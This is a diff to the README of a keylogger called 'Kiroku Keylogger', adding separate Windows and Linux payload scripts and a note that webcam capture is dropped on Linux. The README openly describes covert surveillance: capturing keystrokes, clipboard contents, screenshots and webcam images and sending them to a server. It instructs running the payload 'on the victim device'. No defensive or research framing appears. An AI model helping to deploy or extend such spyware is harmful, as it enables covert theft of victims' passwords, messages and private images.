@@ -9,7 +9,7 @@ Kiroku Keylogger is a sophisticated tool designed to capture and monitor a wide 
 - **Keystroke Logging**: Captures all keystrokes, including special keys like Enter, Tab, and Backspace, and sends them to a specified server.
 - **Clipboard Monitoring**: Continuously monitors clipboard content, detecting changes and sending the updated data to the server.
 - **Screenshot Capture**: Takes screenshots at regular intervals and sends them to the server in a base64-encoded format.
-- **Webcam Image Capture**: Takes webcam image at regular intervals and sends them to the server in a base64-encoded format also.
+- **Webcam Image Capture**: Takes webcam image at regular intervals and sends them to the server in a base64-encoded format also. (Not Compatible with Linux so we removed it)
 - **Modifier Key Tracking**: Tracks the state of Ctrl, Alt, and Shift keys to accurately capture key combinations.
 - **Configurable Intervals**: Allows customization of the intervals for sending keystrokes, clipboard data, and screenshots.
 - **JSON Payloads**: Packages keystrokes, clipboard data, and screenshots into JSON format for server transmission.
@@ -53,7 +53,11 @@ Kiroku Keylogger is a sophisticated tool designed to capture and monitor a wide 
 
 - **On the victim device configure the payload and run the script:**
   ```bash
-  python3 payload.py
+  python3 payload_windows.py
+  ```
+  if your target is Linux machine:
+  ```bash
+  python3 payload_linux.py
   ```
 
 ## How to make the payload run without the need of Python Interpreter?
